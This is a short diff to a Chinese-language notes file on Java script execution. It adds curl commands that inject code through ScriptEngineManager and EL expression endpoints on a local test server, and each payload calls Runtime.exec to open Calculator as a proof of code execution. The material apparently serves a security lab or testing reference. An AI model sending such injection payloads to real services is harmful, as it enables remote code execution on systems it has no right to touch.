@@ -1,5 +1,17 @@
 ### 脚本执行
 
+#### ScriptEngineManager
+
+```
+curl 127.0.0.1:8080/script/javascript -d 'expression=java.lang.Runtime.getRuntime().exec("open /System/Applications/Calculator.app")'
+```
+
+#### EL
+
+```
+curl 127.0.0.1:8080/el/parse -d 'expression=Runtime.getRuntime().exec("open /System/Applications/Calculator.app")'
+```
+
 #### groovy
 
 ```
